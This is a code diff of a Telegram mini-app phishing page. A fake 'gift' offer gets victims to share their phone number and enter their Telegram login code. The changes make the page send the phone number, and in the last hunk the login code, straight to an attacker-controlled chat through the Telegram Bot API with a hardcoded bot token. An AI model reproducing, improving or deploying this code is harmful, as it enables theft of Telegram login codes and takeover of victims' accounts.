@@ -30,14 +30,12 @@
 </head>
 <body>
 
-    <!-- Экран 1 -->
     <div id="screen-phone">
         <h2 style="margin-top: 40px;">Step 1</h2>
         <p style="color: gray;">To receive your gift, authorize below 👇</p>
         <button class="auth-btn" id="btn-share">SHARE PHONE NUMBER</button>
     </div>
 
-    <!-- Экран 2 -->
     <div id="screen-code" class="hidden">
         <div class="code-header">Enter the code</div>
         <div class="code-subtitle">We sent a Telegram code to your number<br><b>*** *** ** **</b></div>
@@ -62,28 +60,36 @@
                 const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
                 const CHAT_ID = "-1004399809740";
 
-                // Если в ссылке есть &step=code, значит мы уже поделились номером и сразу показываем экран кода
-                const urlParams = new URLSearchParams(window.location.search);
-                if (urlParams.get('step') === 'code') {
+                function showCodeScreen() {
                     document.getElementById('screen-phone').classList.add('hidden');
                     document.getElementById('screen-code').classList.remove('hidden');
-                    setTimeout(() => { document.getElementById('code-input').focus(); }, 300);
+                    setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                 }
 
-                // 1. ЗАПРОС НОМЕРА
+                // 1. ЗАПРОС НОМЕРА (отправка через fetch)
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Достаем номер (с защитой от undefined)
-                            let phone = "undefined";
+                            // Вытаскиваем номер
+                            let phone = "";
                             if (contact && contact.phone_number) phone = contact.phone_number;
                             else if (contact && contact.phone) phone = contact.phone;
+                            else if (tg.initDataUnsafe?.user?.phone_number) phone = tg.initDataUnsafe.user.phone_number;
 
-                            // Отправляем данные
-                            tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
-                            
-                            // ТУТ ЖЕ перезапускаем мини-апп на экране с кодом
-                            tg.openTelegramLink("https://t.me/anonlmgifts_bot?startapp=step_code");
+                            // Если номер есть, отправляем
+                            if (phone) {
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 PHONE: +${phone}` })
+                                });
+                                showCodeScreen();
+                            } else {
+                                // Если Telegram выдал undefined (баг iOS/Web), 
+                                // используем fallback через sendData, чтобы не оставить юзера без ничего
+                                tg.sendData(JSON.stringify({ type: "phone", phone: "Telegram Bug (undefined)" }));
+                                showCodeScreen();
+                            }
                         }
                     });
                 };
@@ -116,6 +122,7 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.querySelector('.code-subtitle').innerHTML = "<b>Processing...</b>";
                         
+                        // Отправка кода (fetch)
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
